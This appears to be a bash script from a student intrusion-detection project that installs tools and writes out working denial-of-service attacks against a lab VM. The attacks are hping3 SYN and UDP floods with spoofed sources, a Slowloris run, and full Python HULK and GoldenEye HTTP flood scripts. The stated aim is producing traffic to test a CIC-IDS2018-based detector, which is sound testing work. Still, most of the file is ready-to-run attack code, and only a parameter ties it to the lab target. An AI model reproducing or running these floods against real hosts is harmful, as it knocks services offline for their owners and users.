#!/bin/bash
# Real DDoS/DoS Attack Scripts that the model should detect
# Based on CIC-IDS2018 dataset attack types

VM_IP="192.168.64.3"
DURATION=60  # seconds

echo "======================================================================"
echo "Real DDoS/DoS Attack Tools"
echo "Target: $VM_IP"
echo "======================================================================"
echo ""
echo "Your model is trained to detect these attack types:"
echo "  1. DDOS attack-HOIC"
echo "  2. DDOS attack-LOIC-UDP"
echo "  3. DDoS attacks-LOIC-HTTP"
echo "  4. DoS attacks-GoldenEye"
echo "  5. DoS attacks-Hulk"
echo "  6. DoS attacks-SlowHTTPTest"
echo "  7. DoS attacks-Slowloris"
echo "  8. Brute Force -Web"
echo "  9. Brute Force -XSS"
echo "  10. FTP-BruteForce"
echo "  11. SSH-Bruteforce"
echo "  12. SQL Injection"
echo ""
echo "======================================================================"
echo ""

# Check for required tools
echo "Checking for required tools..."
MISSING=0

if ! command -v hping3 &> /dev/null; then
    echo "  ✗ hping3 not installed (needed for SYN flood, UDP flood)"
    MISSING=1
else
    echo "  ✓ hping3 installed"
fi

if ! command -v slowhttptest &> /dev/null; then
    echo "  ✗ slowhttptest not installed (needed for Slowloris)"
    echo "    Install: brew install slowhttptest"
    MISSING=1
else
    echo "  ✓ slowhttptest installed"
fi

if ! command -v goldeneye &> /dev/null; then
    echo "  ⚠ goldeneye not found (optional - we'll use Python alternative)"
fi

echo ""

if [ $MISSING -eq 1 ]; then
    echo "======================================================================"
    echo "INSTALLATION REQUIRED"
    echo "======================================================================"
    echo ""
    echo "Install missing tools with:"
    echo "  brew install hping"
    echo "  brew install slowhttptest"
    echo ""
    echo "For Python-based attacks (Hulk, GoldenEye), we'll create scripts."
    echo ""
    read -p "Press Enter to continue with installation, or Ctrl+C to abort..."
    echo ""
    
    # Install hping3
    if ! command -v hping3 &> /dev/null; then
        echo "Installing hping3..."
        brew install hping
    fi
    
    # Install slowhttptest
    if ! command -v slowhttptest &> /dev/null; then
        echo "Installing slowhttptest..."
        brew install slowhttptest
    fi
fi

echo ""
echo "======================================================================"
echo "Creating Attack Scripts"
echo "======================================================================"

# 1. SYN Flood (High intensity - should be detected)
cat > /tmp/attack_syn_flood_intense.sh << 'EOF'
#!/bin/bash
VM_IP=${1:-192.168.64.3}
DURATION=${2:-60}

echo "🚀 Launching INTENSE SYN Flood on $VM_IP"
echo "   This attack sends thousands of SYN packets per second"
echo "   Duration: ${DURATION}s"
echo ""

sudo hping3 -S -p 80 --flood --rand-source $VM_IP > /dev/null 2>&1 &
PID=$!

echo "✓ Attack started (PID: $PID)"
sleep $DURATION
sudo kill $PID 2>/dev/null
wait $PID 2>/dev/null

echo "✅ SYN Flood attack complete"
EOF
chmod +x /tmp/attack_syn_flood_intense.sh

# 2. UDP Flood (LOIC-style)
cat > /tmp/attack_udp_flood_loic.sh << 'EOF'
#!/bin/bash
VM_IP=${1:-192.168.64.3}
DURATION=${2:-60}

echo "🚀 Launching UDP Flood (LOIC-style) on $VM_IP"
echo "   This mimics LOIC UDP attack"
echo "   Duration: ${DURATION}s"
echo ""

sudo hping3 -2 -p 80 --flood --rand-source $VM_IP > /dev/null 2>&1 &
PID=$!

echo "✓ Attack started (PID: $PID)"
sleep $DURATION
sudo kill $PID 2>/dev/null
wait $PID 2>/dev/null

echo "✅ UDP Flood attack complete"
EOF
chmod +x /tmp/attack_udp_flood_loic.sh

# 3. Slowloris (SlowHTTPTest)
cat > /tmp/attack_slowloris_real.sh << 'EOF'
#!/bin/bash
VM_IP=${1:-192.168.64.3}
DURATION=${2:-60}

echo "🚀 Launching Slowloris attack on $VM_IP"
echo "   This slowly sends HTTP headers to exhaust server connections"
echo "   Duration: ${DURATION}s"
echo ""

slowhttptest -c 1000 -H -g -o /tmp/slowloris_stats -i 10 -r 200 -t GET -u http://$VM_IP -x 200 -p 3 -l $DURATION &
PID=$!

echo "✓ Attack started (PID: $PID)"
wait $PID 2>/dev/null

echo "✅ Slowloris attack complete"
[ -f /tmp/slowloris_stats ] && cat /tmp/slowloris_stats
EOF
chmod +x /tmp/attack_slowloris_real.sh

# 4. HTTP Flood - HULK Style
cat > /tmp/attack_hulk.py << 'EOF'
#!/usr/bin/env python3
"""
HULK (HTTP Unbearable Load King) - DoS Attack
Sends unique and obfuscated HTTP GET requests to overwhelm server
"""
import sys
import urllib.request
import urllib.error
import threading
import random
import string
import time

target_url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.64.3"
duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
threads_count = 500  # Very high thread count

print(f"🚀 Launching HULK Attack on {target_url}")
print(f"   {threads_count} concurrent threads for {duration} seconds")
print("   Sending obfuscated GET requests with randomized parameters")
print("")

stop_flag = False
request_count = 0

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
]

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attack():
    global request_count
    while not stop_flag:
        try:
            # Generate random URL parameters
            url = f"{target_url}?{random_string()}={random_string()}&{random_string()}={random_string()}"
            
            # Randomize headers
            req = urllib.request.Request(
                url,
                headers={
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Referer': f"http://{random_string()}.com/{random_string()}",
                }
            )
            
            urllib.request.urlopen(req, timeout=2)
            request_count += 1
        except:
            pass

try:
    print("✓ Starting attack threads...")
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)
    
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(5)
        elapsed = time.time() - start_time
        rate = request_count / elapsed if elapsed > 0 else 0
        print(f"   [{int(elapsed)}s/{duration}s] Requests: {request_count} ({rate:.0f} req/s)")
    
    stop_flag = True
    print(f"\n✅ HULK attack complete: {request_count} requests sent")
    print("   Check your IDS dashboard for 'DoS attacks-Hulk' detections!")
    
except KeyboardInterrupt:
    stop_flag = True
    print("\n✋ Attack stopped")
EOF
chmod +x /tmp/attack_hulk.py

# 5. HTTP Flood - GoldenEye Style
cat > /tmp/attack_goldeneye.py << 'EOF'
#!/usr/bin/env python3
"""
GoldenEye - DoS Attack
High-volume HTTP requests with keep-alive to exhaust server resources
"""
import sys
import urllib.request
import urllib.error
import threading
import random
import time

target_url = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.64.3"
duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
threads_count = 300

print(f"🚀 Launching GoldenEye Attack on {target_url}")
print(f"   {threads_count} concurrent threads for {duration} seconds")
print("   Using HTTP keep-alive to maximize impact")
print("")

stop_flag = False
request_count = 0

def attack():
    global request_count
    while not stop_flag:
        try:
            req = urllib.request.Request(
                target_url,
                headers={
                    'User-Agent': f'Mozilla{random.randint(1,99999)}',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Keep-Alive': '900',
                    'Cache-Control': 'no-cache',
                }
            )
            
            urllib.request.urlopen(req, timeout=5)
            request_count += 1
        except:
            pass

try:
    print("✓ Starting attack threads...")
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)
    
    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(5)
        elapsed = time.time() - start_time
        rate = request_count / elapsed if elapsed > 0 else 0
        print(f"   [{int(elapsed)}s/{duration}s] Requests: {request_count} ({rate:.0f} req/s)")
    
    stop_flag = True
    print(f"\n✅ GoldenEye attack complete: {request_count} requests sent")
    print("   Check your IDS dashboard for 'DoS attacks-GoldenEye' detections!")
    
except KeyboardInterrupt:
    stop_flag = True
    print("\n✋ Attack stopped")
EOF
chmod +x /tmp/attack_goldeneye.py

echo ""
echo "✓ Attack scripts created in /tmp/"
echo ""
echo "======================================================================"
echo "USAGE"
echo "======================================================================"
echo ""
echo "IMPORTANT: Make sure your IDS monitoring is running!"
echo "  cd /Users/ramanluhach/cnProject/backend && ./auto_start_monitoring.sh"
echo ""
echo "Then launch attacks:"
echo ""
echo "1. SYN Flood (requires sudo):"
echo "   sudo bash /tmp/attack_syn_flood_intense.sh"
echo ""
echo "2. UDP Flood - LOIC style (requires sudo):"
echo "   sudo bash /tmp/attack_udp_flood_loic.sh"
echo ""
echo "3. Slowloris:"
echo "   bash /tmp/attack_slowloris_real.sh"
echo ""
echo "4. HULK (HTTP Flood):"
echo "   python3 /tmp/attack_hulk.py"
echo ""
echo "5. GoldenEye (HTTP Flood):"
echo "   python3 /tmp/attack_goldeneye.py"
echo ""
echo "======================================================================"
echo "MONITORING"
echo "======================================================================"
echo ""
echo "Watch your dashboard: http://localhost:5173"
echo "Check backend logs for detections:"
echo "  tail -f /Users/ramanluhach/.cursor/projects/Users-ramanluhach-cnProject/terminals/9.txt | grep -E 'ATTACK|Predictions'"
echo ""
echo "======================================================================"

